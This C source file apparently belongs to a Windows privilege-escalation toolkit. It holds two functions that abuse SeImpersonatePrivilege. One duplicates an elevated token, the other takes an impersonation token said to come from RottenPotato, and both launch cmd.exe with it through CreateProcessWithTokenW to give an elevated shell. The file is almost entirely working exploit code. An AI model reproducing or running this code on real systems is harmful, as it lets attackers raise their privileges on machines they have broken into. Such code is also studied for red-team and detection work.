#include "poptoke.h"

// Spawn a shell using SeImpersonatePrivilege, requires an elevated primary token

void
se_impersonate_priv(HANDLE elevated_token)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SECURITY_DESCRIPTOR sdSecurityDescriptor;
	HANDLE duped_token;
	BOOL result;
	SECURITY_ATTRIBUTES sa = { 0 };

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	// create impersonation token
	result = DuplicateTokenEx(elevated_token,
		TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_IMPERSONATE,
		NULL,
		SecurityDelegation,
		TokenImpersonation,
		&duped_token);

	if (!result){
		printf("[-] DuplicateTokenEx failed: %d\n", GetLastError());
		return;
	}

	result = CreateProcessWithTokenW(duped_token,
		0,
		L"C:\\Windows\\System32\\cmd.exe",
		L"C:\\Windows\\System32\\cmd.exe",
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);

	if (!result){
		printf("[-] Failed to create proc: %d\n", GetLastError());
		return;
	}
}

// Spawn a shell using SeImpersonatePrivilege, for use with RottenPotato
void
se_impersonate_priv_imp(HANDLE impersonation_token)
{
	TOKEN_MANDATORY_LABEL TIL = { 0 };
	WCHAR mediumInt[] = L"S-1-16-8192";
	PSID sid = NULL;

	if (!ConvertStringSidToSid(mediumInt, &sid))
		printf("ConvertStringSidToSid fail!\n");

	TIL.Label.Attributes = SE_GROUP_INTEGRITY;
	TIL.Label.Sid = sid;

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL result;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	wchar_t *cmdPath = L"C:\\Windows\\System32\\cmd.exe";
	wchar_t *args = L"";

	printf("Running %S with args %S\n", cmdPath, args);

	DumpIL(impersonation_token);
	result = CreateProcessWithTokenW(impersonation_token,
		0,
		cmdPath,
		args,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);

	if (!result) {
		printf("[-] Failed to create proc: %d\n", GetLastError());
	}
}